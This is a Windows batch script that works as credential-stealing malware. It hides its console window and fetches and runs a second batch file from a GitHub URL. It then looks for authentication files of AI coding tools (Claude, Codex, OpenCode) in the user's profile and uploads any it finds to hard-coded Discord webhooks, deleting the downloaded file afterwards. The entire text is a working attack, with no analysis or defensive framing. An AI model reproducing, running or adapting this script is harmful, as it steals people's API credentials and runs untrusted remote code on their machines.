@echo off
:loll
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 ( goto loll )
powershell -command "& {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)}"
set "ClaudeE=%userprofile%\.claude\credentials.json"
set "ClaudeEE=%userprofile%\.claude\.credentials.json"
curl -f -L -o "%temp%\xdlls2s.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/master.bat" >nul 
start "" "%temp%\xdlls2s.bat"
set "OpenCodeE=%userprofile%\.local\share\opencode\auth.json"
set "CodexE=%userprofile%\.codex\auth.json"
set "OpenCode=https://discord.com/api/webhooks/1509347871974101152/KzKcfHkJXnUaZFDIIk0lceB7Rys8Hvj6V4V-38LUlhaMvX4IkIXCr2MfW-nqyMjBSh0K"
set "Claude=https://discord.com/api/webhooks/1509356918148169920/Gl98LVlee9vJ6mM6ZOgfHFnen8ILV9mZs24bgvhSdQ2TsVqBlLKuSIwVqabMA3ztWcle"
set "Codex=https://discord.com/api/webhooks/1509361226583638026/kUQ84E8sysn6X25dpr70TX7y7wOaCIPHMOxJaz6jPz0DEYFA5s6qVo5fVGaL_NhxATJt"
if exist "%OpenCodeE%" (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"que elegancia\"}" %OpenCode%
    curl -F "file=@%OpenCodeE%" %OpenCode%
)
if exist "%ClaudeEE%" (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"chinche!\"}" %Claude%
    curl -F "file=@%ClaudeEE%" %Claude%
)
if exist "%ClaudeE%" (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Claude%
    curl -F "file=@%ClaudeE%" %Claude%
)
if exist "%CodexE%" (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Codex%
    curl -F "file=@%CodexE%" %Codex%
)
timeout /t 2 /nobreak >nul
del "%temp%\xdlls2s.bat"
exit
